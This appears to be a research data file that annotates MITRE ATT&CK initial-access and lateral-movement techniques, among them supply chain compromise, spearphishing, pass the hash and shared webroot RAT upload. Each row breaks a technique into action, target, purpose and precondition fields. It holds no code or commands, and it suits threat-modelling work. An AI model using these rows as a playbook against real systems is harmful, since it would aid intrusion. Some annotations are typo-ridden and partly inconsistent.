0,0,1,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,658,initial access,spearphishing via service,t1194,send  message/content, personal webmail service,,,,,<what>bypass<\what> some <where>email restrictions<\where> on the work account,bypass,email restriction,social media,leveraging,user execution,"account-address-discovered; 
techniqe:discovery ",,,
1,,,669,initial access,supply chain compromise,t1195 ,manipulate,development tool/development environment/source code repository/source /code/software update/distribution mechanisms,,software provided ,,,<what>gain<\what> <object>execution for access<object>,gain,execution,,,,software-purshace ,execution-for-access -gained,execution-for-access -gained,
,,,670,initial access,supply chain compromise,t1195 ,Compromise/infect,system image,,image provided,,,<what>gain<\what> <object>execution for access<object>,gain,execution,code,,,supplychain-system-access,execution-for-access -gained,execution-for-access -gained,
,,,671,initial access,supply chain compromise,t1195 ,replace,software,,access to system,,,<what>gain<\what> <object>execution for access<object>,gain,execution,image,,,open-source-installed ,execution-for-access -gained,execution-for-access -gained,
,,,672,initial access,supply chain compromise,t1195 ,sell,counterfeit-product,"modified , counterfeit",purshace product,,,<what>gain<\what> <object>execution for access<object>,gain,execution,seeling s/w,,,"account-address-discovered; 
techniqe:discovery ",message-deleiverd,message-deleiverd,
,,,673,initial access,supply chain compromise,t1195 ,add/install ,software,malicious ,access to system,,,<what>gain<\what> <object>execution for access<object>,gain,execution,,,,"account-address-discovered; 
techniqe:discovery ",,,
,,,674,initial access,supply chain compromise,t1195 ,target/use/utilize,open source projects/open source code,malicious,use open source ,,,<what>add<\what> <attribute>malicious<\attribute> <where>code<\where>,add,code,open source,,,"account-address-discovered; 
techniqe:discovery ",,,
,,,675,initial access,supply chain compromise,t1195 ,add,code,malicious ,supplychain ,,,<what>gain<\what> <object>execution for access<object>,,,,,,,,,
1,,,734,initial access,trusted relationship,t1199 ,exploit/use/access,connection/network ,existing,connecton is-a not protected/ connecton is-a insecure,,,<what>gain<\what> access-to<where>network/system<\where>,gain,network/system,<what>exploit<\what>access through trusted third party relationship,,,supplychain-system-access,execution-for-access -gained,execution-for-access -gained,
1,,,186,initial access ,drive-by compromise,t1189 , inject-code/insert-object,browser,,,,,,,,,,,,,,
,,,187,initial access ,drive-by compromise,t1189 ,deliever-code,browser ,,user has-a visit-malicious-website ,,,display contant OR run/execute script ,display OR run,content OR script,,,,,,,
,,,188,initial access ,drive-by compromise,t1189 ,use/inject/post,ads,malicous ,,,,,,,,,,,,,
,,,189,initial access ,drive-by compromise,t1189 ,insert-web-object,browser ,malicous ,,,,display contant OR run/execute script ,display OR run,content OR script,,,,email-address-discoverable ,access-gained,access-gained,
1,,,212,initial access ,exploit public-facing application,t1190,take-advantage/exploit/abuse,software-weakenss/bug/weakness/glitch/vulnerability, software/data/command/databases/sql/standard services/smb/ssh/web servers ,,,,,,,,,,,,,
1,,,647,initial access ,spearphishing attachment,t1193 ,send,email-with-file-attachment ,".doc, .PDF, .zip, .exec file extension / microsoft office documents, executables, pdfs, or archived files ","attachment is-opened
Technqoue: User Executable  ",open ,attachment,"open attachment, gain execution",gain,execuation ,"give a plausible reason why the file should be opened, execute code, payload exploits a vulnerability or directly executes on the user's system",,,,,,
,,,648,initial access ,spearphishing attachment,t1193 ,"execute, exploite","email payload, vulnerability ",".doc, .PDF, .zip, .exec file extension / microsoft office documents, executables, pdfs, or archived files ","attachment is-a opened
techniqe: User Execution ",open ,attachment,"open attachment, gain execution",gain,execuation ,"give a plausible reason why the file should be opened, execute code, payload exploits a vulnerability or directly executes on the user's system",,,,,,
,,,649,initial access ,spearphishing attachment,t1193 ,manipulate ," file extensions  ,  icons ",,,,,hide extension of exeutable files,,,,,,,,,
,1,,381,initial access , hardware additions ,t1200 ,add/introduce/modify, hardware/computer accessories/firmware,,,,," <what>tapping/monitor<\what> <where>network<\where>/
<what> break man-in-the middle<\what><where> encryption <\where>/
<what>inject<\what><where> keystroke  <\where> /
 <what>read<\what> <where> kernel memory via dma <\where>/
<what> add/install <\what> <where> new wireless access <\where> ",,,,,,hardware-access,credential-access/traffic-access,credential-access/traffic-access,
,1,,356,"initial access,lateral movement ", replication through removable media,t1091,use,autorun feature,,<object>media<\object> is <condition>inserted into a system and executes<\condition>,inserted into a system and executes,media,,,,,,,"external-media-allowed,
autorun-enables","code-executed, 
initial-access/lateral-movement","code-executed, 
initial-access/lateral-movement",
,,,357,"initial access,lateral movement ", replication through removable media,t1091,modify,executable file,removable media ,,,,,,,,,,"external-media-allowed,
autorun-enables","code-executed, 
initial-access/lateral-movement","code-executed, 
initial-access/lateral-movement",
,,,382,"initial access,lateral movement ", replication through removable media ,t1091 ,copy-malware-to/move-code-to/modify/fromat,removable media/USP/media firmware,,"Technique:Autorun-enables, and 
<object>media<\object> <condition>inserted into a system and executes<\condition>","enabled, exist/allowed","autorun, removable media",execute code,execute ,code,"copying malware, renaming /
manual manipulation of the media / 
format the media /
modification to the media's firmware itself.",,,"external-media-allowed,
autorun-enables","code-executed, 
initial-access/lateral-movement","code-executed, 
initial-access/lateral-movement",
,1,,229,"initial access,persistence",external remote services,t1133 , use , remote services ,, access has-a <tech> valid accounts <\tech>,,,�initially access and/or persist within a network,,,,,,,,,
,,,230,"initial access,persistence",external remote services,t1133 , obtain/get, credentials ,,,,,,,,"credential pharming, obtaining the credentials from users, <what> compromising <\what> the <where> enterprise network <\where> ",,,,,,
,,,231,"initial access,persistence",external remote services,t1133 ,use,remote services,,,,,redundant access during an operation,,,,,,,,,
,,,37,lateral movement ,application deployment software,t1017,deploy,software,"malicious  ,  remote","permissions required  for this action  <object> local credentials <\object> may be sufficient with direct access to the deployment server, or specific <object> domain credentials <\object> may be required  <condition> require <\condition> an <object> administrative account<\object>","require  ,  require  ,  require","local credentials  ,  local credentials  ,  administrative account",log in or to perform software deployment,,,application deployment systems employed by enterprise administrators,,,,,,
,,,38,lateral movement ,application deployment software,t1017,execution,code,,,,,,,,,,,,,,
,,,39,lateral movement ,application deployment software,t1017,use,access,,,,,laterally <what>move <\what> to <where> systems <\where><what> gather <\what><where>information <\where> <what>wiping <\what> the <where> hard drives <\where> on all endpoints,"move  ,  gather  , wiping","systems  , information  ,  hard drives",,,,,,,
,,,542,lateral movement ,remote services,t1021,use,valid accounts,,"<condition>accept remote <\condition>, <object>connections<\object>",accept remote ,connections,log into a service,,,,,,,,,
,,,592,lateral movement ,shared webroot,t1051,"add , browse","content , content",,that <condition>contains the website's webroot or web content directory<\condition>,contains the website's webroot or web content directory,,execute the malicious content,,,"open network file share , web browser",,,,,,
,,,593,lateral movement ,shared webroot,t1051,execute,content,,,,,,,,,,,,,,
,,,594,lateral movement ,shared webroot,t1051,upload,remote access tool,,,,,,,,,,,,,,
,,,595,lateral movement ,shared webroot,t1051,upload,php script,,when a <object>specific page<\object> <condition>is visited<\condition>. ,is visited,specific page,execute the rat on the system running the web server,,,,,,,,,
,,,596,lateral movement ,shared webroot,t1051,execute,RAT,,,,,,,,,,,,,,
,,,435,lateral movement ,pass the hash,t1075,bypasses,standard authentication steps,,require a <condition> cleartext <\condition> <object> password <\object>,cleartext,password,,,,moving directly into the portion of the authentication,,,,,,
,,,436,lateral movement ,pass the hash,t1075,uses,password hash,valid,,,,,,,,,,,,,
,,,437,lateral movement ,pass the hash,t1075,captured,password hashes,captured,,,,,,,credential access technique,,,,,,
,,,438,lateral movement ,pass the hash,t1075,use,hashes,,once authenticated,,,<what> authenticate <\what> as that <where> user <\where>,authenticate,user,pth,,,,,,
,,,439,lateral movement ,pass the hash,t1075,use,pth,,,,,<what> perform <\what> <where> actions <\where> on local or remote systems,perform,actions,,,,,,,
,,,535,lateral movement ,remote desktop protocol,t1076,connect,system,rdp/rds,service is enabled and allows access to accounts with known credentials,,,expand access,,,,,,,,,
